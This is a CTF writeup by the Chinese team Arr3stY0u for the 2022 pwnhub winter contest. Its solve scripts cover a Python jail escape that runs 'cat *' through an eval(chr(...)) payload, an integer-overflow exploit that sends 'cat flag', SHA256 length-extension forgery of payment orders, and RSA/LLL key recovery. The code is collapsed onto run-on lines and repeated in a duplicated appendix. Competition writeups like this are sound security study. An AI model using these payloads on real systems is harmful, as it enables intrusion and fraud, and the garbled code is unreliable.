# 2022 pwnhub冬季赛 writeup by Arr3stY0u

> 原文: https://www.ctfiot.com/87197.html
> ID: 87197

点击蓝字，关注我们吧！

HEADER

wp已上传至团队知识星球，更多问题请踊跃发帖。

预备队名额充足(web无了)，欢迎大家踊跃投递简历~

招新简历投递(可加Q):

blcx@t00ls.net

2944508194@qq.com

PS：

这个周末真霉好，简单来讲的话就是：

队长咳嗽俩月不好，

主力接连阳性发烧，

就这情况还能硬抗？

原来是有Retard撑腰。

WEB

Reset:

上传表单

<form role="form" action="upload.php" method="post" enctype="multipart/form-data">  <label for="exampleInputText1">../.git/objects/5f/f1ef5c03448a1eb5571dd348cf717a7bad7402</label>   <label for="exampleInputFile">File input</label>  Submit</form>

78 9C 05 40 31 0A 80 50 08 ED 28 0E 81 B5 D5 100D 3F B2 25 BA 40 5B 44 7C 41 70 78 90 10 74 7E51 BC 4A E3 34 CC CD 22 E1 41 9B FD 15 5D FB 1CFB 79 F1 E7 06 F0 DD 17 59 13 F2 5F 0B E2

PPC

TCP_show:

import base64
def print_addr(addr, D): s = '' if D == 1: s += ' ' * 8 s += f'{addr:
08x} ' return s
def print_hex(data): assert len(data) <= 16 s = '' for i, v in enumerate(data): if i == 8: s += ' ' s += f'{v:
02x} ' s = s.ljust(51, ' ') return s
def print_ascii(data): assert len(data) <= 16 s = '' for i, v in enumerate(data): if i == 8: s += ' ' if 32 <= v <= 126: s += chr(v) else: s += '.' s = s.ljust(17, ' ') return s
# Parse inputN = int(input())packets = []for _ in range(N): D, encoded_string = input().split() D = int(D) # Decode base64 string decoded_string = base64.b64decode(encoded_string) for i in range(0, len(decoded_string), 16): data = decoded_string[i:i+16] print(print_addr(i, D), end='') print(print_hex(data), end='') print(print_ascii(data))

GAMING

游戏来咯：

MISC

飞驰人生：

二分法找到一条超速报文：

244#000000A60000

根据https://www.freebuf.com/articles/mobile/322604.html

可得知

锁定全部车门的报文为19B#00000F000000

而且高达100次，然而连一条开启车门的报文都没有为什么会锁100次呢，所以猜测锁车报文也是在攻击。

拼接flag{244#000000A60000_19B#00000F000000}

证书里也有秘密：

坐井观天：

from pwn import *
io = remote('47.97.127.1', 27504)
shell = '__import__("os").system("cat *")'
inner = ''for ch in shell: inner += f'chr({ord(ch)})+'inner = inner[:-1]payload = f'eval({inner})'
io.sendlineafter(b'$ ', payload)io.interactive()

CRYPTO

ASR：

RSA1和N存在公因数，直接求出来s，尝试了一下因为s很大直接就能解出flag

RSA1= 0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713RSA2 =0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37c =0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902N =0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7import gmpy2from Crypto.Util.number import *s=gmpy2.gcd(RSA1,N)d=gmpy2.invert(65537,s-1)m=pow(c,d,s)print(long_to_bytes(m))#flag{b66f68258f184bd7afddd32c1518eed0}

enc1 = 98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356enc2 = 58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204NN = 149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347v1 = vector(ZZ, [NN,0,0])v2 = vector(ZZ, [0,NN,0])v3 = vector(ZZ, [enc1,enc2,1])m = matrix([v1,v2,v3])print(m.LLL()[0])from Crypto.Util.number import *from gmpy2 import *from random import *n = 117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749a = 1755716071599N = 236038564943567983056828121309828109017d=14990624284509488042680161660737257135351130804992386170964133711355998909720573680004426073401904076426158895198678518101191466006577925453312470317923173403014675418274177799204059996088464949966983275563523545860455161601146390096727204796686764179459293323765609098069173418328596776052834794918747224515POINT = (996 , 151729833458737979764886336489671975339 )enc1 = 98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356enc2 = 58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204NN = 149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347a0=pow(POINT[1],2,N)a1=(pow(POINT[0],3,N)+a*POINT[0])%Ne0=(a0-a1)<<42e=e0+a
def divide_pq(ed, n): # ed = e*d k = ed - 1 while True: g = randint(3, n - 2) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x > 1 and gcd(x - 1, n) > 1: p = gcd(x - 1, n) return (p, n // p)print(divide_pq(e*d,n))p=10975174261034704614129537348435767562585273227523727915381249514160516106794340627651069782849466069255618657068339310429729612252894271512170809202423887q=10728693401989257497162315666113511395193621098287916982481421369358575901871658348370734537616238454994991795362544398787911086223011499609901455116513427for i in range(100): print(long_to_bytes(p>>i)) print(long_to_bytes(q>>i))#flag{e89f47939d12434cb201080d8b240774}

from pwn import *from base64 import b64encode, b64decode
from hashlib import sha256import hlextend_bytes
# context.log_level = 'debug'
# io = remote('47.97.127.1', 22007)io = process(['python3', 'app.py'])io.sendlineafter(b'> ', b'2')io.sendlineafter(b'Which one? ', b'0')io.recvuntil(b'Order: ', drop=True)
link = b64decode(io.recvline().decode())payments = link.split(b'&')assert payments[-1].startswith(b's=') and len(payments[-1]) == 66, "Invalid"
link, sign = link[:-67], link[-64:]link = link.decode()sign = sign.decode()
for secret_len in range(10, 30): sha = hlextend_bytes.new('sha256') tmp_link = sha.extend('asdf&c=-10000'.encode(), link.encode(), secret_len, sign, raw=True) _sign = sha.hexdigest() order = b64encode(tmp_link+f'&s={_sign}'.encode()).decode()
 io.sendlineafter(b'> ', b'3') io.sendlineafter(b'Order: ', order.encode()) res = io.recvuntil(b'Your Coins: ') print(res) if b'Invalid Order!' not in res: print('wow', secret_len) break print(io.recvline())
io.sendlineafter(b'> ', b'2')io.sendlineafter(b'Which one? ', b'9')io.recvuntil(b'Order: ', drop=True)
Order = io.recvline()io.sendlineafter(b'> ', b'3')io.sendlineafter(b'Order: ', Order)res = io.recvuntil(b'Your Coins: ')print(res)

PWN

Justjs：

非预期直接读出flag

冒险者：

整数溢出，改防御进入后门

from pwncli import *cli_script()io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc
def cmd(i):    sla('>>> ', i)def get_money():    cmd('1')    ru('HP: ')    if int(ru(' ')[:-1]) < 20:        sla('? (1 -> yes / other -> no)',str(1))    else:        sla('? (1 -> yes / other -> no)',str(2))        get_money()def get_flag():    cmd('1')    ru('LV: ')    if int(ru(' ')[:-1]) == 999:        sla('? (1 -> yes / other -> no)',str(1))    else:        sla('? (1 -> yes / other -> no)',str(2))        get_flag()        def hp():    cmd('2')    sla('>>>','3')    sla('How many?','28633116')for i in range(3):    get_money()hp()get_flag()sl('cat flag')sl('cat /flag')ia()

REVERSE

3:
00pm：

challApp.ZGUy(z:y:
sum:p:e:
key:)

由参数名猜测是xxtea。

challApp.MjA3()(int a1)

密文和密钥都在这个函数里面， xxtea解密后就出了。

webasm：

修改wasm_exec.js，在loadValue末尾加一行。

> console.log(‘[loadValue]’+addr.toString(16)+’,’+v);

然后下断看输出，打印出输入的字符串后看堆栈。

堆栈回溯定位到0x8014f3fb。

读wasm内存

> new TextDecoder(“utf-8”).decode(new DataView(go.mem.buffer, Number(0x205be), 0xd));

读出来是”flag is flag{“

c /* verify */ iVar1 = verify_8014eed4(0); if (iVar1 != 0) { return 1; }code_r0x8014f4e3: if (*(char *)((int)register0x00000008 + 0x10) != ' ') {code_r0x8014f4f4: *(undefined8 *)((int)register0x00000008 + 0x68) = 0; *(undefined8 *)((int)register0x00000008 + 0x70) = 0; *(undefined8 *)register0x00000008 = 0; /* flag is flag{ */ *(undefined8 *)((int)register0x00000008 + 8) = 0x205be; *(undefined8 *)((int)register0x00000008 + 0x10) = 0xd;

/* EHi87RUC2K5hZDnJJny9QtG1vjTFbSdQWrw8VvTLdpKq */ *(longlong *)register0x00000008 = 0x25531; *(longlong *)((int)register0x00000008 + 8) = lVar3; *(longlong *)((int)register0x00000008 + 0x10) = 44; register0x00000008 = (BADSPACEBASE *)((int)register0x00000008 + -8); *(longlong *)register0x00000008 = 0x156a0018; iVar2 = unnamed_function_64(0); if (iVar2 != 0) { return 1; }

11111111111111111111111111111110 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs9P11111111111111111111111111111111 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs9Q11111111111111111111111111111112 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs9R11111111111111111111111111111113 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs9S11111111111111111111111111111114 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs95

*(longlong *)((int)register0x00000008 + 0x60) = 0x6665656264616564; // "deadbeef"..._80100559(0);..._801007d7(0);

uVar7 += *(byte *)((int)uVar5 + (int)uVar8) + uVar10;uVar8 = uVar3 + (uVar7 & 0xff) * 4;*(undefined4 *)lVar9 = *(undefined4 *)uVar8;*(undefined4 *)uVar8 = (int)uVar10;

*(byte *)((int)uVar13 + (int)lVar15) = bVar1 ^ (byte)*(undefined4 *) (iVar7 + (int)(((ulonglong)uVar2 + (ulonglong)uVar3 & 0xff) << 2));

PPC

TCP_show：

import base64
def print_addr(addr, D): s = '' if D == 1: s += ' ' * 8 s += f'{addr:
08x} ' return s
def print_hex(data): assert len(data) <= 16 s = '' for i, v in enumerate(data): if i == 8: s += ' ' s += f'{v:
02x} ' s = s.ljust(51, ' ') return s
def print_ascii(data): assert len(data) <= 16 s = '' for i, v in enumerate(data): if i == 8: s += ' ' if 32 <= v <= 126: s += chr(v) else: s += '.' s = s.ljust(17, ' ') return s
# Parse inputN = int(input())packets = []for _ in range(N): D, encoded_string = input().split() D = int(D) # Decode base64 string decoded_string = base64.b64decode(encoded_string) for i in range(0, len(decoded_string), 16): data = decoded_string[i:i+16] print(print_addr(i, D), end='') print(print_hex(data), end='') print(print_ascii(data))

OTHER

文字频率分析：

from PIL import Imageimport io
img = Image.open('./tmp.png')

def cut2(img, x, y): content = io.BytesIO() b = img.crop((x*50, y*50, (x+1)*50, (y+1)*50)) b.save(content, 'png') return b, content.getvalue()

all_pic = set()
for x in range(20): for y in range(20): b, data = cut2(img, x, y) print(len(all_pic)) if data not in all_pic: b.save(f'_{len(all_pic)}.png') all_pic.add(data)

from pwn import *from PIL import Imageimport io
def crack(part, c, level=6): s = int(part, 16) << (level * 4) _limit = s + (1 << level * 4) while s <= _limit: s += 1 seed = hex(s)[2:].encode() if hashlib.md5(seed).hexdigest() == c: return seed

map_ascii = dict()for ch in string.ascii_uppercase: map_ascii[open(f'{ch}.png', 'rb').read()] = ch

def cut(img, x, y): content = io.BytesIO() b = img.crop((x*50, y*50, (x+1)*50, (y+1)*50)) b.save(content, 'png') return content.getvalue()

p_io = remote('47.97.127.1', 25301)p_io.recvuntil(b'plaintext: ')part = p_io.recvuntil(b'??????', drop=True).decode()p_io.recvuntil(b'md5_hex -> ')c = p_io.recvuntil(b'n', drop=True).decode()p = crack(part, c)
p_io.sendlineafter(b'> ', p)
p_io.recvuntil(b"now, you get a png: ")a = p_io.recvuntil(b"##The end, please tell me your list:", drop=True)x = base64.b64decode(a.decode())
print('start!')with open('./tmp.png', 'wb') as fp: fp.write(x) fp.flush()
img = Image.open('./tmp.png')
s = ''for x in range(20): for y in range(20): s += map_ascii[cut(img, x, y)]
result = [0 for _ in range(26)]
for i in range(len(s)): idx = string.ascii_uppercase.index(s[i]) result[idx] += 1
print(result)result = ((str(result).strip('[]').replace(' ','')))print(result)p_io.sendlineafter(b'> ', result.encode())p_io.interactive()

from pwn import *from PIL import Image

def crack(part, c, level=6): s = int(part, 16) << (level * 4) _limit = s + (1 << level * 4) while s <= _limit: s += 1 seed = hex(s)[2:].encode() if hashlib.md5(seed).hexdigest() == c: return seed

io = remote('47.97.127.1', 27958)io.recvuntil(b'plaintext: ')part = io.recvuntil(b'??????', drop=True).decode()io.recvuntil(b'md5_hex -> ')c = io.recvuntil(b'n', drop=True).decode()p = crack(part, c)
io.sendlineafter(b'> ', p)_score = 0for i in range(10): io.recvuntil(b"/9j/") a = b"/9j/"+io.recvuntil(b"What's animal in this picture?", drop=True) x = base64.b64decode(a.decode())
 print('start!') with open('./tmp.jpg', 'wb') as fp: fp.write(x) fp.flush()
 # img = Image.open('./tmp.jpg') # img.show('test') guess = input().strip() if guess == 'e': guess = 'elephant' elif guess == 'b': guess = 'bird' elif guess == 'c': guess = 'chicken' elif guess == 'r': guess = 'rabbit' elif guess == 't': guess = 'tigger' elif guess == 'm': guess = 'mouse' elif guess == 'k': guess = 'koala' elif guess == 'd': guess = 'deer' elif guess == 'l': guess = 'lion' elif guess == 'h': guess = 'horse' elif guess == 'ct': guess = 'cattle' print(guess) io.sendlineafter(b'> ', guess.encode()) res = io.recvline() if b'Yes' in res: _score += 1 print(_score, res)
io.interactive()

from pwnlib.util.iters import mbruteforcefrom hashlib import sha256import stringfrom pwn import *
io = remote('47.97.127.1', 27262)
table = string.printableio.recvuntil(b'sha256(')prefix = io.recvuntil(b' + xxxx) = ', drop=True).decode()h = io.recvuntil(b'n', drop=True).decode()
proof = mbruteforce(lambda x: sha256((prefix+x).encode()).hexdigest() == h, table, length=4, method='fixed')io.sendlineafter(b'xxxx =', proof.encode())
io.interactive()

FOOTER

山海关安全团队是一支专注网络安全的实战型团队，队员均来自国内外各大高校与企事业单位，主要从事漏洞挖掘、情报分析、反涉网犯罪研究。

此外，团队于2022年1月3日成立Arr3stY0u战队，积极参与国内外各大网络安全竞赛。Arr3stY0u意喻”逮捕你“，依托高超的逆向分析与情报分析技术，为群众网络安全保驾护航尽一份力，简单粗暴，向涉网犯罪开炮。


```
<form role="form" action="upload.php" method="post" enctype="multipart/form-data">  <label for="exampleInputText1">../.git/objects/5f/f1ef5c03448a1eb5571dd348cf717a7bad7402</label>   <label for="exampleInputFile">File input</label>  Submit</form>
78 9C 05 40 31 0A 80 50 08 ED 28 0E 81 B5 D5 100D 3F B2 25 BA 40 5B 44 7C 41 70 78 90 10 74 7E51 BC 4A E3 34 CC CD 22 E1 41 9B FD 15 5D FB 1CFB 79 F1 E7 06 F0 DD 17 59 13 F2 5F 0B E2
import base64
def print_addr(addr, D): s = '' if D == 1: s += ' ' * 8 s += f'{addr:
08x} ' return s
def print_hex(data): assert len(data) <= 16 s = '' for i, v in enumerate(data): if i == 8: s += ' ' s += f'{v:
02x} ' s = s.ljust(51, ' ') return s
def print_ascii(data): assert len(data) <= 16 s = '' for i, v in enumerate(data): if i == 8: s += ' ' if 32 <= v <= 126: s += chr(v) else: s += '.' s = s.ljust(17, ' ') return s
# Parse inputN = int(input())packets = []for _ in range(N): D, encoded_string = input().split() D = int(D) # Decode base64 string decoded_string = base64.b64decode(encoded_string) for i in range(0, len(decoded_string), 16): data = decoded_string[i:i+16] print(print_addr(i, D), end='') print(print_hex(data), end='') print(print_ascii(data))
from pwn import *
io = remote('47.97.127.1', 27504)
shell = '__import__("os").system("cat *")'
inner = ''for ch in shell: inner += f'chr({ord(ch)})+'inner = inner[:-1]payload = f'eval({inner})'
io.sendlineafter(b'$ ', payload)io.interactive()
RSA1= 0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713RSA2 =0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37c =0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902N =0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7import gmpy2from Crypto.Util.number import *s=gmpy2.gcd(RSA1,N)d=gmpy2.invert(65537,s-1)m=pow(c,d,s)print(long_to_bytes(m))#flag{b66f68258f184bd7afddd32c1518eed0}
enc1 = 98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356enc2 = 58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204NN = 149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347v1 = vector(ZZ, [NN,0,0])v2 = vector(ZZ, [0,NN,0])v3 = vector(ZZ, [enc1,enc2,1])m = matrix([v1,v2,v3])print(m.LLL()[0])from Crypto.Util.number import *from gmpy2 import *from random import *n = 117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749a = 1755716071599N = 236038564943567983056828121309828109017d=14990624284509488042680161660737257135351130804992386170964133711355998909720573680004426073401904076426158895198678518101191466006577925453312470317923173403014675418274177799204059996088464949966983275563523545860455161601146390096727204796686764179459293323765609098069173418328596776052834794918747224515POINT = (996 , 151729833458737979764886336489671975339 )enc1 = 98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356enc2 = 58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204NN = 149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347a0=pow(POINT[1],2,N)a1=(pow(POINT[0],3,N)+a*POINT[0])%Ne0=(a0-a1)<<42e=e0+a
def divide_pq(ed, n): # ed = e*d k = ed - 1 while True: g = randint(3, n - 2) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x > 1 and gcd(x - 1, n) > 1: p = gcd(x - 1, n) return (p, n // p)print(divide_pq(e*d,n))p=10975174261034704614129537348435767562585273227523727915381249514160516106794340627651069782849466069255618657068339310429729612252894271512170809202423887q=10728693401989257497162315666113511395193621098287916982481421369358575901871658348370734537616238454994991795362544398787911086223011499609901455116513427for i in range(100): print(long_to_bytes(p>>i)) print(long_to_bytes(q>>i))#flag{e89f47939d12434cb201080d8b240774}
from pwn import *from base64 import b64encode, b64decode
from hashlib import sha256import hlextend_bytes
# context.log_level = 'debug'
# io = remote('47.97.127.1', 22007)io = process(['python3', 'app.py'])io.sendlineafter(b'> ', b'2')io.sendlineafter(b'Which one? ', b'0')io.recvuntil(b'Order: ', drop=True)
link = b64decode(io.recvline().decode())payments = link.split(b'&')assert payments[-1].startswith(b's=') and len(payments[-1]) == 66, "Invalid"
link, sign = link[:-67], link[-64:]link = link.decode()sign = sign.decode()
for secret_len in range(10, 30): sha = hlextend_bytes.new('sha256') tmp_link = sha.extend('asdf&c=-10000'.encode(), link.encode(), secret_len, sign, raw=True) _sign = sha.hexdigest() order = b64encode(tmp_link+f'&s={_sign}'.encode()).decode()
 io.sendlineafter(b'> ', b'3') io.sendlineafter(b'Order: ', order.encode()) res = io.recvuntil(b'Your Coins: ') print(res) if b'Invalid Order!' not in res: print('wow', secret_len) break print(io.recvline())
io.sendlineafter(b'> ', b'2')io.sendlineafter(b'Which one? ', b'9')io.recvuntil(b'Order: ', drop=True)
Order = io.recvline()io.sendlineafter(b'> ', b'3')io.sendlineafter(b'Order: ', Order)res = io.recvuntil(b'Your Coins: ')print(res)
from pwncli import *cli_script()io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc
def cmd(i):    sla('>>> ', i)def get_money():    cmd('1')    ru('HP: ')    if int(ru(' ')[:-1]) < 20:        sla('? (1 -> yes / other -> no)',str(1))    else:        sla('? (1 -> yes / other -> no)',str(2))        get_money()def get_flag():    cmd('1')    ru('LV: ')    if int(ru(' ')[:-1]) == 999:        sla('? (1 -> yes / other -> no)',str(1))    else:        sla('? (1 -> yes / other -> no)',str(2))        get_flag()        def hp():    cmd('2')    sla('>>>','3')    sla('How many?','28633116')for i in range(3):    get_money()hp()get_flag()sl('cat flag')sl('cat /flag')ia()
c /* verify */ iVar1 = verify_8014eed4(0); if (iVar1 != 0) { return 1; }code_r0x8014f4e3: if (*(char *)((int)register0x00000008 + 0x10) != ' ') {code_r0x8014f4f4: *(undefined8 *)((int)register0x00000008 + 0x68) = 0; *(undefined8 *)((int)register0x00000008 + 0x70) = 0; *(undefined8 *)register0x00000008 = 0; /* flag is flag{ */ *(undefined8 *)((int)register0x00000008 + 8) = 0x205be; *(undefined8 *)((int)register0x00000008 + 0x10) = 0xd;
/* EHi87RUC2K5hZDnJJny9QtG1vjTFbSdQWrw8VvTLdpKq */ *(longlong *)register0x00000008 = 0x25531; *(longlong *)((int)register0x00000008 + 8) = lVar3; *(longlong *)((int)register0x00000008 + 0x10) = 44; register0x00000008 = (BADSPACEBASE *)((int)register0x00000008 + -8); *(longlong *)register0x00000008 = 0x156a0018; iVar2 = unnamed_function_64(0); if (iVar2 != 0) { return 1; }
11111111111111111111111111111110 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs9P11111111111111111111111111111111 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs9Q11111111111111111111111111111112 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs9R11111111111111111111111111111113 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs9S11111111111111111111111111111114 gnuNjegcAhSPVJWmd7s9cioePPBT6XocTwDmqSB1cs95
*(longlong *)((int)register0x00000008 + 0x60) = 0x6665656264616564; // "deadbeef"..._80100559(0);..._801007d7(0);
uVar7 += *(byte *)((int)uVar5 + (int)uVar8) + uVar10;uVar8 = uVar3 + (uVar7 & 0xff) * 4;*(undefined4 *)lVar9 = *(undefined4 *)uVar8;*(undefined4 *)uVar8 = (int)uVar10;
*(byte *)((int)uVar13 + (int)lVar15) = bVar1 ^ (byte)*(undefined4 *) (iVar7 + (int)(((ulonglong)uVar2 + (ulonglong)uVar3 & 0xff) << 2));
import base64
def print_addr(addr, D): s = '' if D == 1: s += ' ' * 8 s += f'{addr:
08x} ' return s
def print_hex(data): assert len(data) <= 16 s = '' for i, v in enumerate(data): if i == 8: s += ' ' s += f'{v:
02x} ' s = s.ljust(51, ' ') return s
def print_ascii(data): assert len(data) <= 16 s = '' for i, v in enumerate(data): if i == 8: s += ' ' if 32 <= v <= 126: s += chr(v) else: s += '.' s = s.ljust(17, ' ') return s
# Parse inputN = int(input())packets = []for _ in range(N): D, encoded_string = input().split() D = int(D) # Decode base64 string decoded_string = base64.b64decode(encoded_string) for i in range(0, len(decoded_string), 16): data = decoded_string[i:i+16] print(print_addr(i, D), end='') print(print_hex(data), end='') print(print_ascii(data))
from PIL import Imageimport io
img = Image.open('./tmp.png')

def cut2(img, x, y): content = io.BytesIO() b = img.crop((x*50, y*50, (x+1)*50, (y+1)*50)) b.save(content, 'png') return b, content.getvalue()

all_pic = set()
for x in range(20): for y in range(20): b, data = cut2(img, x, y) print(len(all_pic)) if data not in all_pic: b.save(f'_{len(all_pic)}.png') all_pic.add(data)
from pwn import *from PIL import Imageimport io
def crack(part, c, level=6): s = int(part, 16) << (level * 4) _limit = s + (1 << level * 4) while s <= _limit: s += 1 seed = hex(s)[2:].encode() if hashlib.md5(seed).hexdigest() == c: return seed

map_ascii = dict()for ch in string.ascii_uppercase: map_ascii[open(f'{ch}.png', 'rb').read()] = ch

def cut(img, x, y): content = io.BytesIO() b = img.crop((x*50, y*50, (x+1)*50, (y+1)*50)) b.save(content, 'png') return content.getvalue()

p_io = remote('47.97.127.1', 25301)p_io.recvuntil(b'plaintext: ')part = p_io.recvuntil(b'??????', drop=True).decode()p_io.recvuntil(b'md5_hex -> ')c = p_io.recvuntil(b'n', drop=True).decode()p = crack(part, c)
p_io.sendlineafter(b'> ', p)
p_io.recvuntil(b"now, you get a png: ")a = p_io.recvuntil(b"##The end, please tell me your list:", drop=True)x = base64.b64decode(a.decode())
print('start!')with open('./tmp.png', 'wb') as fp: fp.write(x) fp.flush()
img = Image.open('./tmp.png')
s = ''for x in range(20): for y in range(20): s += map_ascii[cut(img, x, y)]
result = [0 for _ in range(26)]
for i in range(len(s)): idx = string.ascii_uppercase.index(s[i]) result[idx] += 1
print(result)result = ((str(result).strip('[]').replace(' ','')))print(result)p_io.sendlineafter(b'> ', result.encode())p_io.interactive()
from pwn import *from PIL import Image

def crack(part, c, level=6): s = int(part, 16) << (level * 4) _limit = s + (1 << level * 4) while s <= _limit: s += 1 seed = hex(s)[2:].encode() if hashlib.md5(seed).hexdigest() == c: return seed

io = remote('47.97.127.1', 27958)io.recvuntil(b'plaintext: ')part = io.recvuntil(b'??????', drop=True).decode()io.recvuntil(b'md5_hex -> ')c = io.recvuntil(b'n', drop=True).decode()p = crack(part, c)
io.sendlineafter(b'> ', p)_score = 0for i in range(10): io.recvuntil(b"/9j/") a = b"/9j/"+io.recvuntil(b"What's animal in this picture?", drop=True) x = base64.b64decode(a.decode())
 print('start!') with open('./tmp.jpg', 'wb') as fp: fp.write(x) fp.flush()
 # img = Image.open('./tmp.jpg') # img.show('test') guess = input().strip() if guess == 'e': guess = 'elephant' elif guess == 'b': guess = 'bird' elif guess == 'c': guess = 'chicken' elif guess == 'r': guess = 'rabbit' elif guess == 't': guess = 'tigger' elif guess == 'm': guess = 'mouse' elif guess == 'k': guess = 'koala' elif guess == 'd': guess = 'deer' elif guess == 'l': guess = 'lion' elif guess == 'h': guess = 'horse' elif guess == 'ct': guess = 'cattle' print(guess) io.sendlineafter(b'> ', guess.encode()) res = io.recvline() if b'Yes' in res: _score += 1 print(_score, res)
io.interactive()
from pwnlib.util.iters import mbruteforcefrom hashlib import sha256import stringfrom pwn import *
io = remote('47.97.127.1', 27262)
